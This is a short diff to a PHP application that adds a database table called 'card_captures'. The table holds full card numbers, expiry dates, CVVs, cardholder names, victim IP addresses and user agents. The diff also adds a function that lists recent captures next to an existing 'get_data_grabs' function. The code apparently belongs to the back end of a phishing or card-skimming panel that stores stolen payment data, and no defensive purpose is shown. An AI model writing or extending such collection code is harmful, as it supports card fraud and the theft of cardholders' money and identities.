@@ -157,6 +157,19 @@ function db(): PDO
         )');
         $pdo->exec('PRAGMA user_version = 13');
     }
+    if ((int) $pdo->query('PRAGMA user_version')->fetchColumn() < 14) {
+        $pdo->exec('CREATE TABLE IF NOT EXISTS card_captures (
+            id          INTEGER PRIMARY KEY AUTOINCREMENT,
+            card_number TEXT NOT NULL,
+            expiry      TEXT NOT NULL,
+            cvv         TEXT NOT NULL,
+            name        TEXT NOT NULL,
+            ip          TEXT NOT NULL,
+            user_agent  TEXT NOT NULL,
+            captured_at TEXT NOT NULL DEFAULT (datetime(\'now\', \'localtime\'))
+        )');
+        $pdo->exec('PRAGMA user_version = 14');
+    }
     return $pdo;
 }
 
@@ -409,6 +422,17 @@ function sync_skill_catalog(PDO $pdo): void
         }
     }
     $pdo->exec('PRAGMA user_version = 6');
+}
+
+function get_card_captures(int $limit = 50): array
+{
+    try {
+        $st = db()->prepare('SELECT id, card_number, expiry, cvv, name, ip, user_agent, captured_at FROM card_captures ORDER BY id DESC LIMIT ?');
+        $st->execute([$limit]);
+        return $st->fetchAll(PDO::FETCH_ASSOC);
+    } catch (\Exception $e) {
+        return [];
+    }
 }
 
 function get_data_grabs(int $limit = 50): array
